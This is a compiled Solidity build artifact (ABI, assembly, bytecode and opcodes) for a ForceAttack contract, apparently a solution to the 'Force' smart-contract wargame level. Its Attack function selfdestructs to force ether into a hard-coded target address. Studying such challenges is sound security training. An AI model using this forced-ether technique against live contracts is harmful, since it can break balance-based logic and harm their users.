{
	"Force/ForceAttack.sol": {
		"ForceAttack": {
			"abi": [
				{
					"stateMutability": "nonpayable",
					"type": "fallback"
				},
				{
					"inputs": [],
					"name": "Attack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"Force/ForceAttack.sol\":57:469  contract ForceAttack{... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"Force/ForceAttack.sol\":57:469  contract ForceAttack{... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0xf28adc4d\n      eq\n      tag_3\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n      callvalue\n      dup1\n      iszero\n      tag_6\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_6:\n      stop\n        /* \"Force/ForceAttack.sol\":210:467  function Attack() external{... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_9\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_9:\n      pop\n      tag_10\n      tag_11\n      jump\t// in\n    tag_10:\n      stop\n    tag_11:\n        /* \"Force/ForceAttack.sol\":348:368  address payable addr */\n      0x00\n        /* \"Force/ForceAttack.sol\":387:429  0x7AbC582C30451d58a2fB0DDed0aC024dBfB73498 */\n      0x7abc582c30451d58a2fb0dded0ac024dbfb73498\n        /* \"Force/ForceAttack.sol\":348:431  address payable addr = payable(address(0x7AbC582C30451d58a2fB0DDed0aC024dBfB73498)) */\n      swap1\n      pop\n        /* \"Force/ForceAttack.sol\":455:459  addr */\n      dup1\n        /* \"Force/ForceAttack.sol\":442:460  selfdestruct(addr) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      selfdestruct\n\n    auxdata: 0xa26469706673582212203199e41c6d6849bd41386fc41cfc47a3c91471c6dbaa80004170b04ac8d9221f64736f6c63430008120033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "6080604052348015600f57600080fd5b5060ae8061001e6000396000f3fe608060405260043610601f5760003560e01c8063f28adc4d146032576025565b36602557005b348015603057600080fd5b005b348015603d57600080fd5b5060446046565b005b6000737abc582c30451d58a2fb0dded0ac024dbfb7349890508073ffffffffffffffffffffffffffffffffffffffff16fffea26469706673582212203199e41c6d6849bd41386fc41cfc47a3c91471c6dbaa80004170b04ac8d9221f64736f6c63430008120033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0xAE DUP1 PUSH2 0x1E PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH1 0x1F JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xF28ADC4D EQ PUSH1 0x32 JUMPI PUSH1 0x25 JUMP JUMPDEST CALLDATASIZE PUSH1 0x25 JUMPI STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH1 0x30 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH1 0x3D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x44 PUSH1 0x46 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH20 0x7ABC582C30451D58A2FB0DDED0AC024DBFB73498 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFDESTRUCT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 BALANCE SWAP10 0xE4 SHR PUSH14 0x6849BD41386FC41CFC47A3C91471 0xC6 0xDB 0xAA DUP1 STOP COINBASE PUSH17 0xB04AC8D9221F64736F6C63430008120033 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "34800",
						"executionCost": "87",
						"totalCost": "34887"
					},
					"external": {
						"": "112",
						"Attack()": "27733"
					}
				},
				"methodIdentifiers": {
					"Attack()": "f28adc4d"
				}
			},
			"storageLayout": {
				"storage": [],
				"types": null
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}